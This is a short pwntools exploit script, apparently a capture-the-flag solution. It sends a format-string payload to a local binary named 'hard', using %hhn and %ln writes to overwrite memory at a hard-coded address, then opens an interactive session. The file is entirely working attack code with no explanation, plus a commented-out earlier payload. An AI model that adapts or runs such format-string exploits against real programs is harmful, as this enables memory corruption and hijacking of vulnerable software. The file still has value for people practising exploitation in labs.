from pwn import *

p = process('./hard')

# 0x7ffff7de7ac0
value = 0x30
target = 0x601050 
read_printf = 0x400668
	
# 06, 40, e7 ( 1, 2, 0 )
payload = ''
payload += '%6d%14$hhn%58d%15$hhn%40d%13$hhn%'
payload += str(target-0x600de0-0x68-0x8)+'d%56$ln'
payload += 'a'*(0x8 * 7 - len(payload))
payload += p64(target) + p64(target+1) + p64(target+2)
    
p.send(payload)
'''
pay = ''
pay += 'a'*0x8
pay += 'b'*0x8
pay += 'c'*0x8
pay += 'd'*0x8
pay += 'e'*0x8
pay += 'f'*0x8
pay += p64(target)	# read_
pay += p64(target)
p.send(pay)
'''
p.interactive()
